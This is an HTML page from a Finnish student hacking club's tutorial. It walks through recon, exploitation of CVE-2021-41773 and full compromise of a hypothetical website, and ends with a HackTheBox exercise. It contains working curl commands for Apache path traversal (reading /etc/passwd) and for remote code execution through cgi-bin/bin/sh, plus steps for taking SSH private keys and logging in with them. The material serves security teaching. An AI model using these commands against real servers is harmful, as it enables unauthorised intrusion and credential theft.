@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="H-T8 on Haaga-Helian tietojenkäsittelijöille suunnattu kerho hakkerointikerho.">
+    <title>Hakkerointikerho H-T8</title>
+    <link rel="stylesheet" href="/H-T8/main-style.css">
+    <link rel="shortcut icon" type="image/x-icon" href="/H-T8/assets/main_logo.webp">
+    <script type="module" src="/H-T8/src/main.js" defer></script>
+    <script type="module" src="/H-T8/src/modules/progressTracker.js" defer></script>
+</head>
+
+<body>
+    <div id="transition-overlay" class="active"></div>
+    <main>
+        <div id="header-container"></div>
+        <section class="page-content">
+
+            <div class="space-50"></div>
+
+            <h1 class="h2">Common Weak Spots</h1>
+            <p class="paragraph-secondary">SECTION 5</p>
+
+            <div class="progress-container">
+                <div class="progress-header">
+                    <div class="progress-title">Your Progress</div>
+                    <div class="progress-stats">x of x sections completed</div>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill">
+                        <span class="progress-text"></span>
+                    </div>
+                </div>
+            </div>
+            <h2 class="h4">Full Example: Small Weak Spots To Full Compromise</h2>
+            <p class="paragraph-secondary">
+                Let's go through a realistic scenario, from small weak spot to full access.
+            </p>
+            <br>
+            <div class="break-line"></div>
+            <br>
+            <h2 class="h4">Target: A small company website hosted on a public server.</h2>
+            <p class="paragraph-secondary">
+                <strong> Your mission:</strong> Find the weaknesses, pivot, chain them, own the box.
+            </p>
+            <br>
+            <h2 class="h4">Step 1: Recon</h2>
+            <p class="paragraph-secondary">
+                <strong>Tool:</strong> Nmap
+                <br>
+                <strong>Goal:</strong> Find open ports, services, directories, files.
+            </p>
+            <pre class="code-snippet">
+$ sudo nmap -sV targetsite.com
+            </pre>
+            <p class="paragraph-secondary">
+                <strong>Example output:</strong>
+                <br>
+            <pre class="code-snippet">
+Port 80 open - Apache 2.4.49
+Port 22 open - SSH
+                </pre>
+            </p>
+
+            <h2 class="h4">Step 2: Find Weak Spots</h2>
+            <ul class="paragraph-secondary general-list">
+                <li>You spot the Apache version.</li>
+                <li>You hit <a href="https://www.cve.org">cve.org</a>. Search <code
+                        class="inline-code-snippet">Apache 2.4.49</code>.</li>
+                <li>You find <strong>CVE-2021-41773</strong>. Path traversal exploit confirmed.</li>
+            </ul>
+
+            <h2 class="h4">Step 3: Exploit</h2>
+            <p class="paragraph-secondary">
+                You craft a malicious URL based on the CVE details:
+            </p>
+            <pre class="code-snippet">
+$ curl http://targetsite.com/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd
+            </pre>
+
+            <p class="paragraph-secondary">
+                Result: You successfully read <code class="inline-code-snippet">/etc/passwd</code>. Proof of path
+                traversal.
+            </p>
+            <br>
+
+            <h2 class="h4">Step 4: Pivot to Full Access</h2>
+            <p class="paragraph-secondary">
+                Now you have a foothold. Why stop at reading files? Research shows CVE-2021-41773 can allow Remote
+                Code Execution (RCE) if mod_cgi is enabled.
+                <br><br>
+                Exploit attempt:
+            </p>
+            <pre class="code-snippet">
+$ curl -d 'echo "hacked" > /tmp/pwned' http://targetsite.com/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh
+            </pre>
+            <p class="paragraph-secondary">
+                Assuming mod_cgi is active, you've now run commands on the server.
+            </p>
+            <br>
+            <h2 class="h4">Step 5: Full Compromise</h2>
+            <p class="paragraph-secondary">
+                With command execution:
+            <ul class="paragraph-secondary general-list">
+                <li>You explore the file system.</li>
+                <li>You find an <code class="inline-code-snippet">.ssh</code> folder.</li>
+                <li>You dump SSH private keys.</li>
+                <li>You connect via SSH:</li>
+            </ul>
+            <pre class="code-snippet">
+$ ssh -i id_rsa user@targetsite.com
+            </pre>
+            <p class="paragraph-secondary beginner">
+                <span>🎉 Congratulations, you now have persistent shell access!</span>
+                <br><br>
+            </p>
+            <p class="paragraph-secondary">
+                This probably seems really complicated right now, and you don't need to know how everything works, but
+                you understand the concept behind the exploitation loop.
+                <br><br>
+                This is how valuable vulnerabilities are found.
+                It's a chain, not one click to the end. Hacking is slow, everything takes time and you need to go trough
+                a lot of nothing before you hit the weak spot. It requires a lot of patience.
+            </p>
+            <br>
+            <div class="break-line"></div>
+            <h2 class="h4">Quick Tips for Beginner Hackers</h2>
+
+            <ul class="paragraph-secondary general-list">
+                <li>Don’t rush, map the system before exploiting.</li>
+                <li>Research every version number, service, and detail. And document it separately.</li>
+                <li>CVE.org, Exploit-DB, check them constantly and if you don't understand something, learn it before
+                    you move on.</li>
+                <li>Assume the first vuln isn't the last, pivot and chain.</li>
+                <li>Practice only in safe labs or with permission. Never attack without permission.</li>
+            </ul>
+            <br>
+            <div class="break-line"></div>
+            <h2 class="h4">Final Assignment: Hack The Box Starting Point</h2>
+            <p class="paragraph-secondary">
+                <strong>Goal:</strong> Apply everything — recon, vulnerability identification, chaining, access.
+                <br>
+                <strong>Platform:</strong> <a class="flapper-link" href="https://app.hackthebox.com/starting-point"
+                    target="_blank">HackTheBox Starting Point</a>
+                <br>
+                <strong>Recommended Target:</strong> <code class="inline-code-snippet">Archetype</code>,
+                beginner-friendly, clear steps, real-world feel.
+                <br>
+                <strong>Requirements:</strong> You need to create a free HackTheBox account to access the machine.
+            </p>
+            <img class="image" src="/H-T8/assets/Pasted image 20250701002636.png" alt="">
+            <img class="image" src="/H-T8/assets/Pasted image 20250701002831.png" alt="">
+            <p class="paragraph-secondary">
+                You can find the machine under <code class="inline-code-snippet">Starting Point - Tier 2 tab</code>.
+                From there you can spawn the the machine, after you have connected to HackTheBox Servers, with either
+                Pwnbox or OpenVPN. Don't know how to connect? Refer to <a class="flapper-link" href="https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access">how to connect</a>.
+            </p>
+            <ul class="paragraph-secondary general-list">
+                <li>Follow the steps in the guide.</li>
+                <li>Use Nmap to find open ports and services.</li>
+                <li>Identify vulnerabilities using CVE.org.</li>
+                <li>Chain exploits to gain access.</li>
+                <li>Document your process, findings, and any challenges.</li>
+
+            </ul>
+
+
+            <!-- Section Completion Checkbox -->
+            <div class="section-completion">
+                <div class="container">
+                    <input type="checkbox" id="section10-completed" class="section-completion-checkbox"
+                        style="display: none;">
+                    <label for="section10-completed" class="check">
+                        <svg width="18px" height="18px" viewBox="0 0 18 18">
+                            <path
+                                d="M 1 9 L 1 9 c 0 -5 3 -8 8 -8 L 9 1 C 14 1 17 5 17 9 L 17 9 c 0 4 -4 8 -8 8 L 9 17 C 5 17 1 14 1 9 L 1 9 Z">
+                            </path>
+                            <polyline points="1 9 7 14 15 4"></polyline>
+                        </svg>
+                    </label>
+                </div>
+                <label for="section10-completed" class="section-completion-label">
+                    Mark this section as completed
+                </label>
+            </div>
+
+            <!-- Navigation Buttons -->
+            <div class="navigation-buttons">
+                <a href="../section9/" class="nav-button">← Previous: Common Weak spots</a>
+                <a href="../section11/" class="nav-button">Next: How to continue your learning journey →</a>
+            </div>
+
+            <div class="space-100"></div>
+        </section>
+        <div id="footer-container"></div>
+    </main>
+
+    <script>
+        // Initialize progress tracker for this section
+        document.addEventListener('DOMContentLoaded', function () {
+            const initializeProgress = () => {
+                if (window.progressTracker) {
+                    window.progressTracker.updateUI();
+                } else {
+                    setTimeout(initializeProgress, 100);
+                }
+            };
+
+            initializeProgress();
+        });
+    </script>
+</body>
+
+</html>
